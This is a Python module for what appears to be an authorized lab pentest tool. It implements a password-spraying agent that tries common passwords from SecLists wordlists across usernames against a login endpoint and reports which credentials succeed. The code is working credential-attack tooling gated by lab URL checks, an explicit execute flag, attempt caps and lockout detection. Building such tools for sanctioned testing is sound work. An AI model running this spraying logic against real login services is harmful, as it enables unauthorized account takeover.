from __future__ import annotations

import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

import httpx

from .auth_attempts import execute_auth_attempt, validate_auth_contract
from .lab_http import load_wordlist, same_origin_url, validate_lab_url, write_jsonl


DEFAULT_USERNAME_WORDLISTS = (
    Path("data/wordlists/SecLists/Usernames/top-usernames-shortlist.txt"),
)
DEFAULT_PASSWORD_WORDLISTS = (
    Path(
        "data/wordlists/SecLists/Passwords/Common-Credentials/"
        "xato-net-10-million-passwords-1000.txt"
    ),
)


@dataclass
class PasswordSprayConfig:
    target_url: str
    endpoint: str
    username_wordlist_paths: list[Path] = field(
        default_factory=lambda: list(DEFAULT_USERNAME_WORDLISTS)
    )
    password_wordlist_paths: list[Path] = field(
        default_factory=lambda: list(DEFAULT_PASSWORD_WORDLISTS)
    )
    wordlist_roots: tuple[Path, ...] = (Path("data/wordlists"),)
    username_field: str = "username"
    password_field: str = "password"
    request_format: str = "json"
    static_fields: dict[str, Any] = field(default_factory=dict)
    headers: dict[str, str] = field(default_factory=dict)
    success_statuses: tuple[int, ...] = (200,)
    failure_statuses: tuple[int, ...] = (400, 401, 403)
    success_json_paths: tuple[str, ...] = ()
    max_users: int = 10
    max_passwords: int = 3
    max_attempts: int = 30
    delay_seconds: float = 0.5
    timeout_seconds: float = 5.0
    stop_after_successes: int = 1
    verify_tls: bool = True
    execution_mode: str = "safe"
    execute: bool = False
    reveal_credentials: bool = False
    trace_path: Path | None = None


class PasswordSprayAgent:
    def __init__(self, config: PasswordSprayConfig):
        self.config = config

    def run(self) -> dict[str, Any]:
        base_url = validate_lab_url(self.config.target_url)
        endpoint = same_origin_url(base_url, self.config.endpoint)
        if not self.config.execute:
            raise PermissionError("Password spraying requires explicit execute=True.")
        if self.config.execution_mode != "aggressive_lab":
            raise PermissionError(
                "Password spraying is restricted to execution_mode=aggressive_lab."
            )
        validate_auth_contract(
            username_field=self.config.username_field,
            password_field=self.config.password_field,
            request_format=self.config.request_format,
            success_statuses=self.config.success_statuses,
            failure_statuses=self.config.failure_statuses,
            success_json_paths=self.config.success_json_paths,
            headers=self.config.headers,
        )
        if not 1 <= self.config.max_users <= 50:
            raise ValueError("max_users must be between 1 and 50.")
        if not 1 <= self.config.max_passwords <= 10:
            raise ValueError("max_passwords must be between 1 and 10.")
        if not 1 <= self.config.max_attempts <= 100:
            raise ValueError("max_attempts must be between 1 and 100.")
        if not 1 <= self.config.stop_after_successes <= 20:
            raise ValueError("stop_after_successes must be between 1 and 20.")
        if not 0 <= self.config.delay_seconds <= 30:
            raise ValueError("delay_seconds must be between 0 and 30.")
        if not 0.2 <= self.config.timeout_seconds <= 30:
            raise ValueError("timeout_seconds must be between 0.2 and 30.")

        usernames, username_sources = load_wordlist(
            self.config.username_wordlist_paths,
            limit=self.config.max_users,
            allowed_roots=self.config.wordlist_roots,
        )
        passwords, password_sources = load_wordlist(
            self.config.password_wordlist_paths,
            limit=self.config.max_passwords,
            allowed_roots=self.config.wordlist_roots,
        )
        identities = usernames[: self.config.max_users]
        passwords = passwords[: self.config.max_passwords]
        attempts: list[dict[str, Any]] = []
        successes: list[dict[str, Any]] = []
        stop_reason = "wordlists_exhausted"
        consecutive_server_errors = 0
        headers = {
            "User-Agent": "MedFlow-Authorized-Lab-Password-Spray-Agent/1.0",
            **self.config.headers,
        }

        with httpx.Client(
            timeout=httpx.Timeout(self.config.timeout_seconds),
            follow_redirects=False,
            verify=self.config.verify_tls,
            headers=headers,
        ) as client:
            for password_index, password in enumerate(passwords, start=1):
                for username_index, identity in enumerate(identities, start=1):
                    if len(attempts) >= self.config.max_attempts:
                        stop_reason = "attempt_budget_exhausted"
                        break
                    attempt = execute_auth_attempt(
                        client,
                        endpoint=endpoint,
                        identity=identity,
                        password=password,
                        username_index=username_index,
                        password_index=password_index,
                        username_field=self.config.username_field,
                        password_field=self.config.password_field,
                        request_format=self.config.request_format,
                        static_fields=self.config.static_fields,
                        success_statuses=self.config.success_statuses,
                        failure_statuses=self.config.failure_statuses,
                        success_json_paths=self.config.success_json_paths,
                    )
                    attempts.append(attempt)
                    outcome = attempt["outcome"]
                    if outcome == "authenticated":
                        success = {
                            "username": identity,
                            "username_index": username_index,
                            "password_index": password_index,
                            "status": attempt.get("status"),
                            "proof": (
                                "The configured success status and response signal matched. "
                                + (
                                    "The accepted lab password was retained because explicit "
                                    "plaintext credential reporting was enabled. No response "
                                    "value or session token was retained."
                                    if self.config.reveal_credentials
                                    else "No credential or token value was retained."
                                )
                            ),
                        }
                        if self.config.reveal_credentials:
                            success["password"] = password
                        successes.append(success)
                        if len(successes) >= self.config.stop_after_successes:
                            stop_reason = "success_threshold_reached"
                            break
                    if outcome == "lockout_detected":
                        stop_reason = "lockout_or_rate_limit_detected"
                        break
                    if outcome in {"server_error", "transport_error"}:
                        consecutive_server_errors += 1
                        if consecutive_server_errors >= 3:
                            stop_reason = "repeated_transport_or_server_errors"
                            break
                    else:
                        consecutive_server_errors = 0
                    if self.config.delay_seconds:
                        time.sleep(self.config.delay_seconds)
                if stop_reason != "wordlists_exhausted":
                    break

        trace_path = write_jsonl(self.config.trace_path, attempts)
        counts: dict[str, int] = {}
        for item in attempts:
            outcome = str(item["outcome"])
            counts[outcome] = counts.get(outcome, 0) + 1
        attempted_identities = list(
            dict.fromkeys(
                str(item["username"])
                for item in attempts
                if item.get("username")
            )
        )
        attempted_password_indices = {
            int(item["password_index"])
            for item in attempts
            if item.get("password_index") is not None
        }
        if successes:
            status = "confirmed_credential"
        elif stop_reason == "lockout_or_rate_limit_detected":
            status = "lockout_observed"
        elif stop_reason == "repeated_transport_or_server_errors":
            status = "tool_error"
        else:
            status = "ran_no_finding"
        return {
            "agent": "Password Spray Agent",
            "status": status,
            "target_url": base_url,
            "endpoint": endpoint,
            "attempted": len(attempts),
            "successful": len(successes),
            "username_candidates_loaded": len(identities),
            "unique_identities_attempted": len(attempted_identities),
            "password_candidates_loaded": len(passwords),
            "password_candidates_attempted": len(
                attempted_password_indices
            ),
            "attempted_identities": attempted_identities,
            "successes": successes,
            "plaintext_credentials_retained": bool(
                successes and self.config.reveal_credentials
            ),
            "outcome_counts": counts,
            "stop_reason": stop_reason,
            "lockout_detected": stop_reason == "lockout_or_rate_limit_detected",
            "username_wordlists": username_sources,
            "password_wordlists": password_sources,
            "trace_path": trace_path,
            "limits": {
                "max_users": self.config.max_users,
                "max_passwords": self.config.max_passwords,
                "max_attempts": self.config.max_attempts,
                "delay_seconds": self.config.delay_seconds,
            },
        }
